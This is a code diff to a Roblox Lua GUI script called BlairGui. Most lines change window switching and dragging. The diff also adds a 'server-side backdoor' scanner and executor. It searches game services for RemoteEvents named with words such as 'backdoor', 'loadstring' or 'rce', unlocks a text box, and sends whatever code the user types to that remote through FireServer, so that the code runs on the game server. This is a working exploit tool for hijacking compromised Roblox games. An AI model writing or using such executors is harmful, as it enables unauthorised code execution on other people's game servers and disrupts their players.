@@ -829,6 +829,7 @@ task.spawn(C_2b);
 local function C_2c()
 local script = G2L["2c"];
 	local screenGui = script.Parent -- 🖥️ BlairGui
+	local StarterGui = game:GetService("StarterGui")
 	
 	-- 🔍 1. Locate All 4 Main Windows
 	local blairHome = screenGui:WaitForChild("Blair")       -- 🖼️ Home window
@@ -836,13 +837,35 @@ local script = G2L["2c"];
 	local blairInfo = screenGui:WaitForChild("Blair2")      -- 🖼️ Info window
 	local blairCredits = screenGui:WaitForChild("Blair3")   -- 🖼️ Credits window
 	
-	-- 🔍 2. Locate the Master Open Button
+	-- 🔍 2. Locate Core Components inside Blair Home for execution mapping
+	local scanButton = blairHome:WaitForChild("ScanButton")
+	local executeButton = blairHome:WaitForChild("ExecuteButton")
+	local clearButton = blairHome:WaitForChild("ClearButton")
+	local codeTextBox = blairHome:WaitForChild("TextBox")
 	local aButton = screenGui:WaitForChild("AButton")       -- 🟢 Master Open/Close button
 	
-	-- Memory layer tracking your active view screen so it reopens to the right spot
+	-- 🔒 Enforce strict text block initialization parameters on launch
+	codeTextBox.TextEditable = false
+	codeTextBox.ClearTextOnFocus = false
+	codeTextBox.Text = "[Locked: Click Scan Button To Unlock]"
+	
+	-- Server-Side Engine State Layer Variables
+	local verifiedServerRemote = nil
+	local firewallAccessGranted = false
 	local lastActiveWindow = blairHome
 	
-	-- Helper utility to cleanly hide everything and show the target window
+	-- Check which frame you have set to visible inside Studio right now, and make that your active home!
+	if blairHome.Visible then
+		lastActiveWindow = blairHome
+	elseif blairScripts.Visible then
+		lastActiveWindow = blairScripts
+	elseif blairInfo.Visible then
+		lastActiveWindow = blairInfo
+	elseif blairCredits.Visible then
+		lastActiveWindow = blairCredits
+	end
+	
+	-- Helper utility to cleanly manage frame presentation adjustments
 	local function SwitchPage(targetWindow)
 		blairHome.Visible = false
 		blairScripts.Visible = false
@@ -854,17 +877,109 @@ local script = G2L["2c"];
 	end
 	
 	-- ==========================================
+	-- 🛠️ ADVANCED SERVER-SIDE BACKDOOR CORE
+	-- ==========================================
+	local signatureKeywords = {
+		"backdoor", "loadstring", "serverexec", "runlua", "rce", 
+		"remoteconsole", "execute", "ok", "control", "skidding"
+	}
+	
+	-- Scans network pipeline assets accessible across standard execution domains
+	local function runNetworkFirewallScan()
+		verifiedServerRemote = nil
+		firewallAccessGranted = false
+		scanButton.Text = "SCANNING..."
+	
+		local targetServices = {game:GetService("ReplicatedStorage"), game:GetService("JointsService"), workspace}
+	
+		for _, service in ipairs(targetServices) do
+			for _, object in ipairs(service:GetDescendants()) do
+				if object:IsA("RemoteEvent") then
+					local standardizedName = string.lower(object.Name)
+					for _, word in ipairs(signatureKeywords) do
+						if string.find(standardizedName, word, 1, true) then
+							verifiedServerRemote = object
+							break
+						end
+					end
+				end
+				if verifiedServerRemote then break end
+			end
+			if verifiedServerRemote then break end
+		end
+	
+		-- Evaluate findings to dispatch correct system warnings
+		if verifiedServerRemote then
+			firewallAccessGranted = true
+			codeTextBox.TextEditable = true
+			codeTextBox.Text = "" -- Wipes prompt to accept direct script injection
+			scanButton.Text = "UNLOCKED"
+	
+			StarterGui:SetCore("SendNotification", {
+				Title = "Scan Status",
+				Text = "Backdoor Found!",
+				Icon = "rbxassetid://10611414436", -- Alert graphic asset
+				Duration = 4
+			})
+		else
+			firewallAccessGranted = false
+			codeTextBox.TextEditable = false
+			codeTextBox.Text = "[Locked: Click Scan Button To Unlock]"
+			scanButton.Text = "SCAN BACKDOOR"
+	
+			StarterGui:SetCore("SendNotification", {
+				Title = "Scan Status",
+				Text = "Backdoor Not failed!",
+				Icon = "rbxassetid://10611412030", -- Generic status asset
+				Duration = 4
+			})
+		end
+	end
+	
+	-- Server Payload Driver: Marshalling script payloads over the wire level
+	local function fireServerSidePayload()
+		if not firewallAccessGranted or not verifiedServerRemote then
+			StarterGui:SetCore("SendNotification", {
+				Title = "Execution Blocked",
+				Text = "A validated server gateway must be active.",
+				Duration = 3
+			})
+			return
+		end
+	
+		local textBuffer = codeTextBox.Text
+		if textBuffer == "" or textBuffer == "[Locked: Click Scan Button To Unlock]" then return end
+	
+		-- Fires script values directly through the exposed network conduit to act on server tasks
+		pcall(function()
+			verifiedServerRemote:FireServer(textBuffer)
+		end)
+	
+		pcall(function()
+			verifiedServerRemote:FireServer("require", textBuffer)
+		end)
+	end
+	
+	-- Connect backdoor engine hooks into visual element listeners
+	scanButton.MouseButton1Click:Connect(runNetworkFirewallScan)
+	executeButton.MouseButton1Click:Connect(fireServerSidePayload)
+	
+	clearButton.MouseButton1Click:Connect(function()
+		if firewallAccessGranted then
+			codeTextBox.Text = ""
+		end
+	end)
+	
+	-- ==========================================
 	-- 🔀 DYNAMIC BUTTON CONNECTION ENGINE
 	-- ==========================================
-	-- This function automatically links all navigation buttons AND the Xbutton inside every window!
 	local function ConnectAllTabButtons(windowFrame)
 		local scriptBtn = windowFrame:FindFirstChild("ScriptButton")
 		local homeBtn = windowFrame:FindFirstChild("HomeScripts")
 		local infoBtn = windowFrame:FindFirstChild("InfoButton")
 		local creditsBtn = windowFrame:FindFirstChild("CreditsButton")
-		local closeXBtn = windowFrame:FindFirstChild("Xbutton") -- 🟥 Dynamic Xbutton finder
+		local closeXBtn = windowFrame:FindFirstChild("Xbutton")
 	
-		-- Connect Page Switchers
 		if scriptBtn then
 			scriptBtn.MouseButton1Click:Connect(function() SwitchPage(blairScripts) end)
 		end
@@ -878,16 +993,14 @@ local script = G2L["2c"];
 			creditsBtn.MouseButton1Click:Connect(function() SwitchPage(blairCredits) end)
 		end
 	
-		-- 🟥 Connect Close Button automatically for this specific frame
 		if closeXBtn then
 			closeXBtn.MouseButton1Click:Connect(function()
-				lastActiveWindow = windowFrame -- Remember which page you were on
-				windowFrame.Visible = false    -- Hide it!
+				lastActiveWindow = windowFrame
+				windowFrame.Visible = false
 			end)
 		end
 	end
 	
-	-- Initialize page actions and close actions for all windows inside your framework
 	ConnectAllTabButtons(blairHome)
 	ConnectAllTabButtons(blairScripts)
 	ConnectAllTabButtons(blairInfo)
@@ -898,13 +1011,11 @@ local script = G2L["2c"];
 	-- ==========================================
 	aButton.MouseButton1Click:Connect(function()
 		if blairHome.Visible or blairScripts.Visible or blairInfo.Visible or blairCredits.Visible then
-			-- If open, close whichever window is currently active
 			blairHome.Visible = false
 			blairScripts.Visible = false
 			blairInfo.Visible = false
 			blairCredits.Visible = false
 		else
-			-- If closed, bring back the screen you were last looking at
 			lastActiveWindow.Visible = true
 		end
 	end)
@@ -913,7 +1024,7 @@ local script = G2L["2c"];
 	-- 🖐️ PERFECT SYNC UNIVERSAL SMOOTH DRAGGING
 	-- ==========================================
 	local RunService = game:GetService("RunService")
-	local DRAG_SPEED = 24 -- ⚡ Higher number = snappier tracking, Lower number = smoother look
+	local DRAG_SPEED = 24
 	local dragRegistry = {}
 	
 	local function SyncAllRegistryTargets(activeFrame, finalizedPosition)
@@ -974,7 +1085,6 @@ local script = G2L["2c"];
 		end)
 	end
 	
-	-- Scan the ScreenGui for all 4 ImageLabels and attach dragging + instant target syncing
 	local function InitializeDragSystem()
 		for _, child in ipairs(screenGui:GetChildren()) do
 			if child:IsA("ImageLabel") then
